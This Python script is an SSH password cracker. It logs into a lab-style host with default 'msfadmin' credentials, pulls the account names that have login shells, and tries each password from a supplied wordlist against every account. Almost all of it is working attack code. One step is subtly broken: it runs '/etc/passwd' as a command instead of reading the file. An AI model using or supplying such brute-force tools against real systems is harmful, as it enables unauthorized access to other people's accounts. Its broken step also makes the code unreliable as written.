import paramiko

def get_users_from_etc_passwd(ip,username,password):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)
        ssh.connect(ip,port=22,username=username,password=password)
        command = "/etc/passwd"
        stdin, stdout, stderr = ssh.exec_command(command)
        users = stdout.read().decode().split("\n")
        return [user.split(":")[0] for user in users if "/bin/bash" in user or "/bin/sh" in user]
    except Exception as e:
        print(f"Error while getting users {e}")
        return []

def ssh_password_cracker(ip,username,password):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip,port=22,username=username,password=password)
        print(f"Connection Established... username: {username}, password: {password}")
        return True
    except Exception as e:
        print(f"Could not establish connection for user '{username}' and password '{password}' {e}")
        return False
    finally:
        ssh.close()
def main():
    ip = "10.0.2.128"
    username = "msfadmin"
    password = "msfadmin"

    user_list = get_users_from_etc_passwd(ip,username,password)
    if not user_list:
        print("No users found or error occurred while fetching users.")
        return
    password_list_file = input("Enter the path to the password list file:")
    with open(password_list_file,"r") as f:
        passwords = [line.strip() for line in f]

    for user in user_list:
        for password in passwords:
            if ssh_password_cracker(ip,user,password):
                break

if __name__ =="__main__":
    main()
